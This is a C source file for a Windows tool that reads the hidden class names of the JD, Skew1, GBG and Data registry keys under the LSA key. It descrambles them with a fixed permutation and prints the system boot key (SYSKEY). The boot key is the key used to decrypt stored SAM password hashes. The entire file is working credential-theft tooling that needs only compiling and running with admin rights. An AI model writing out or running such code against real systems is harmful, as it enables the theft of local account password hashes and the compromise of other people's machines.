/*
 * bootkey.c - Windows Boot Key (SYSKEY) Extractor
 * Compile: cl bootkey.c /O2 /Fe:bootkey.exe
 *          gcc bootkey.c -O2 -o bootkey.exe
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

static const unsigned char perm[16] = {
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
    0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7
};

static int get_class(HKEY h, const char* path, char* buf, DWORD sz) {
    HKEY k;
    DWORD n = sz;
    if (RegOpenKeyExA(h, path, 0, KEY_READ, &k) != ERROR_SUCCESS) return -1;
    int r = (RegQueryInfoKeyA(k, buf, &n, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) ? (int)n : -1;
    RegCloseKey(k);
    return r;
}

int main(void) {
    const char* t[4] = {"JD", "Skew1", "GBG", "Data"};
    const char* b[2] = {"SYSTEM\\CurrentControlSet\\Control\\Lsa", "SYSTEM\\ControlSet001\\Control\\Lsa"};
    char s[64] = {0};
    char c[256];
    unsigned char d[16];
    unsigned char bk[16];
    int i, bi = -1;
    size_t len;

    for (i = 0; i < 2; i++) {
        sprintf(c, "%s\\JD", b[i]);
        if (get_class(HKEY_LOCAL_MACHINE, c, c, sizeof(c)) > 0) { bi = i; break; }
    }
    if (bi < 0) { printf("[-] You Need Admin\n"); return 1; }

    printf("[+] Base: HKLM\\%s\n", b[bi]);
    for (i = 0; i < 4; i++) {
        int n;
        sprintf(c, "%s\\%s", b[bi], t[i]);
        n = get_class(HKEY_LOCAL_MACHINE, c, c, sizeof(c));
        if (n <= 0) { printf("[-] Failed: %s\n", t[i]); return 1; }
        if (c[n-1] == 0) n--;  /* strip null */
        printf("[+] %s: '%s' (length=%d)\n", t[i], c, n);
        strncat(s, c, n);
    }

    len = strlen(s);
    if (len == 30) strcat(s, "00");
    else if (len == 31) strcat(s, "0");
    else if (len != 32) { printf("[-] Bad length: %zu\n", len); return 1; }

    printf("[+] Scrambled: %s\n", s);
    for (i = 0; i < 16; i++) sscanf(s + i*2, "%2hhx", &d[i]);

    /* 修复: boot_key[i] = scrambled[perm[i]] */
    for (i = 0; i < 16; i++) bk[i] = d[perm[i]];

    printf("[+] Boot Key: ");
    for (i = 0; i < 16; i++) printf("%02x", bk[i]);
    printf("\n");
    return 0;
}
